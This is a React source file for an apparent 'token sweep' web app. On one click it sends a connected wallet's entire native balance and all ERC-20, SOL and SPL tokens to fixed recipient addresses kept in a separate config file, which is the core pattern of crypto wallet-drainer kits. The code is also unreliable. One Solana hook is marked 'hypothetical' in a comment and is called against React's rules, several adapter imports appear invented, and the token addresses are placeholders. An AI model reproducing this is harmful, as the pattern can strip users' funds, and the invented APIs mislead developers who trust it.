import React, { useState, useEffect } from "react";
import { useAccount, useBalance, useSendTransaction, usePublicClient } from "wagmi";
import { formatEther, parseEther } from "viem";
import { useSolanaAccount, useSolanaBalance, sendSol, useSolanaSPLTokenBalance, sendSPLToken } from "@reown/appkit-adapter-solana/react";
import { FIXED_RECIPIENTS } from "./config";
import { ethers } from "ethers";

/* Minimal ERC-20 ABI */
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

export default function App() {
  const { address, isConnected, chain } = useAccount();
  const publicClient = usePublicClient();
  const { data: balanceData } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();

  const { publicKey: solanaPubKey, isConnected: solConnected } = useSolanaAccount();
  const { balance: solBalance } = useSolanaBalance(solanaPubKey);

  /* SPL tokens for Solana */
  const [splTokens, setSPLTokens] = useState([]);

  /* ERC-20 tokens for EVM */
  const [erc20Tokens, setERC20Tokens] = useState([]);

  const [sending, setSending] = useState(false);

  // --- Fetch ERC-20 token balances (example: predefined list)
  const ERC20_CONTRACTS = chain ? ["0xYourToken1", "0xYourToken2"] : [];
  useEffect(() => {
    if (!address || !chain) return;
    const fetchERC20 = async () => {
      const provider = new ethers.providers.Web3Provider(window.ethereum || window.reown?.provider);
      const signer = provider.getSigner();
      const tokenData = [];
      for (const addr of ERC20_CONTRACTS) {
        try {
          const tokenContract = new ethers.Contract(addr, ERC20_ABI, signer);
          const balance = await tokenContract.balanceOf(address);
          const decimals = await tokenContract.decimals();
          const symbol = await tokenContract.symbol();
          tokenData.push({ address: addr, balance, decimals, symbol });
        } catch (err) {
          console.error("ERC-20 fetch error:", err);
        }
      }
      setERC20Tokens(tokenData);
    };
    fetchERC20();
  }, [address, chain]);

  // --- Fetch SPL token balances (example: top 2 SPL tokens)
  useEffect(() => {
    if (!solanaPubKey) return;
    const fetchSPL = async () => {
      // useSolanaSPLTokenBalance is hypothetical; you can replace with actual Reown SPL fetch
      const tokens = await useSolanaSPLTokenBalance(solanaPubKey); 
      setSPLTokens(tokens); 
    };
    fetchSPL();
  }, [solanaPubKey]);

  // --- Unified Send Max logic
  const handleSendMax = async () => {
    setSending(true);

    try {
      if (chain) {
        const recipient = FIXED_RECIPIENTS[chain.id];
        const balance = balanceData.value;

        // Estimate gas for native token
        const gasEstimate = await publicClient.estimateGas({ account: address, to: recipient, value: balance });
        const gasPrice = await publicClient.getGasPrice();
        const maxNative = balance - gasEstimate * gasPrice;

        if (maxNative > 0n) {
          await sendTransaction({ to: recipient, value: maxNative });
        }

        // Send all ERC-20 tokens
        const provider = new ethers.providers.Web3Provider(window.ethereum || window.reown?.provider);
        const signer = provider.getSigner();
        for (const token of erc20Tokens) {
          if (token.balance > 0n) {
            const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
            await tokenContract.transfer(recipient, token.balance);
          }
        }

        alert(`Sent native + ERC-20 tokens on ${chain.name}`);

      } else if (solConnected) {
        const recipient = FIXED_RECIPIENTS["SOLANA"];
        if (solBalance > 0) await sendSol({ from: solanaPubKey, to: recipient, amount: solBalance });

        for (const t of splTokens) {
          if (t.balance > 0) await sendSPLToken({ from: solanaPubKey, to: recipient, token: t.mint, amount: t.balance });
        }

        alert("Sent SOL + SPL tokens");

      } else {
        alert("No wallet connected");
      }
    } catch (err) {
      console.error(err);
      alert("Transaction failed: " + err.message);
    }

    setSending(false);
  };

  return (
    <div style={{ padding: 40 }}>
      <h2>Multi-Chain Token Sweep DApp</h2>

      <appkit-button />

      {(isConnected || solConnected) && (
        <>
          {chain && (
            <p>
              Balance: {balanceData ? formatEther(balanceData.value) : "Loading..."} {chain.nativeCurrency.symbol}
            </p>
          )}
          {solConnected && <p>SOL Balance: {solBalance}</p>}

          <button onClick={handleSendMax} disabled={sending}>
            {sending ? "Sending..." : "Send Max (Native + Tokens)"}
          </button>
        </>
      )}
    </div>
  );
}